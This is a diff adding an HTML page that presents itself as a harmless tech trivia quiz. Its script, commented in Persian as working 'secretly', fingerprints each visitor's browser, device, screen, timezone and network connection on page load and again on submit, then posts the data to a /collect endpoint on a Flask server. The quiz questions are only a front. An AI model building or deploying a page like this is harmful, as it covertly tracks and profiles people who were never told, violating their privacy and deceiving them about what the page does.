@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fun Tech Quiz - Test Your Knowledge!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+            margin-top: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #eee;
+        }
+
+        h1 {
+            color: #764ba2;
+            margin-bottom: 10px;
+            font-size: 2.2rem;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 1.1rem;
+        }
+
+        .quiz-section {
+            margin: 30px 0;
+        }
+
+        .question {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .question h3 {
+            color: #764ba2;
+            margin-bottom: 15px;
+        }
+
+        .options {
+            display: grid;
+            gap: 10px;
+        }
+
+        .option {
+            padding: 12px;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .option:hover {
+            background: #667eea;
+            color: white;
+            border-color: #667eea;
+        }
+
+        .result {
+            text-align: center;
+            padding: 20px;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .fun-fact {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+            font-style: italic;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        button {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .primary-btn {
+            background: #764ba2;
+            color: white;
+        }
+
+        .primary-btn:hover {
+            background: #5a3780;
+            transform: translateY(-2px);
+        }
+
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            color: white;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            .buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🎯 Tech Knowledge Quiz</h1>
+            <p class="subtitle">Test your knowledge about technology and computers!</p>
+        </header>
+
+        <div class="fun-fact">
+            <i class="fas fa-lightbulb"></i>
+            <strong>Did you know?</strong> The first computer mouse was made of wood!
+        </div>
+
+        <div class="quiz-section">
+            <div class="question">
+                <h3>1. What does CPU stand for?</h3>
+                <div class="options">
+                    <div class="option" onclick="selectAnswer(this, 1)">A) Central Processing Unit</div>
+                    <div class="option" onclick="selectAnswer(this, 1)">B) Computer Personal Unit</div>
+                    <div class="option" onclick="selectAnswer(this, 1)">C) Central Process Unit</div>
+                    <div class="option" onclick="selectAnswer(this, 1)">D) Computer Processing Unit</div>
+                </div>
+            </div>
+
+            <div class="question">
+                <h3>2. Which programming language is known as the 'language of the web'?</h3>
+                <div class="options">
+                    <div class="option" onclick="selectAnswer(this, 2)">A) Python</div>
+                    <div class="option" onclick="selectAnswer(this, 2)">B) JavaScript</div>
+                    <div class="option" onclick="selectAnswer(this, 2)">C) Java</div>
+                    <div class="option" onclick="selectAnswer(this, 2)">D) C++</div>
+                </div>
+            </div>
+
+            <div class="question">
+                <h3>3. What year was the first iPhone released?</h3>
+                <div class="options">
+                    <div class="option" onclick="selectAnswer(this, 3)">A) 2005</div>
+                    <div class="option" onclick="selectAnswer(this, 3)">B) 2007</div>
+                    <div class="option" onclick="selectAnswer(this, 3)">C) 2009</div>
+                    <div class="option" onclick="selectAnswer(this, 3)">D) 2010</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="result" id="result">
+            <h3>🎉 Quiz Completed!</h3>
+            <p>Thanks for testing your knowledge! You're awesome!</p>
+        </div>
+
+        <div class="buttons">
+            <button class="primary-btn" onclick="submitQuiz()">
+                <i class="fas fa-paper-plane"></i> Submit Answers
+            </button>
+            <button class="secondary-btn" onclick="resetQuiz()">
+                <i class="fas fa-redo"></i> Try Again
+            </button>
+        </div>
+    </div>
+
+    <footer>
+        <p>Fun educational quiz - Test your tech knowledge!</p>
+    </footer>
+
+    <script>
+        // جمع‌آوری اطلاعات دستگاه به صورت مخفیانه
+        function collectDeviceInfo() {
+            const deviceInfo = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                online: navigator.onLine,
+                doNotTrack: navigator.doNotTrack
+            };
+
+            // اگر connection API در دسترس باشد
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                deviceInfo.connectionType = conn.effectiveType;
+                deviceInfo.downlink = conn.downlink;
+                deviceInfo.rtt = conn.rtt;
+                deviceInfo.saveData = conn.saveData;
+            }
+
+            // ارسال اطلاعات به سرور Flask
+            fetch('/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(deviceInfo)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Device info sent successfully');
+            })
+            .catch(error => {
+                console.error('Error sending device info:', error);
+            });
+        }
+
+        // اجرای جمع‌آوری اطلاعات هنگام لود صفحه
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(collectDeviceInfo, 1000);
+        });
+
+        // توابع مربوط به کوییز (برای ظاهر صفحه)
+        function selectAnswer(element, questionNum) {
+            // حذف انتخاب‌های قبلی برای این سوال
+            const options = element.parentElement.querySelectorAll('.option');
+            options.forEach(opt => {
+                opt.style.background = '#f8f9fa';
+                opt.style.color = '#333';
+                opt.style.borderColor = '#e9ecef';
+            });
+
+            // هایلایت گزینه انتخاب شده
+            element.style.background = '#764ba2';
+            element.style.color = 'white';
+            element.style.borderColor = '#764ba2';
+        }
+
+        function submitQuiz() {
+            document.getElementById('result').style.display = 'block';
+            // جمع‌آوری مجدد اطلاعات هنگام سابمیت
+            collectDeviceInfo();
+        }
+
+        function resetQuiz() {
+            document.getElementById('result').style.display = 'none';
+            const options = document.querySelectorAll('.option');
+            options.forEach(opt => {
+                opt.style.background = '#f8f9fa';
+                opt.style.color = '#333';
+                opt.style.borderColor = '#e9ecef';
+            });
+        }
+    </script>
+</body>
+</html>
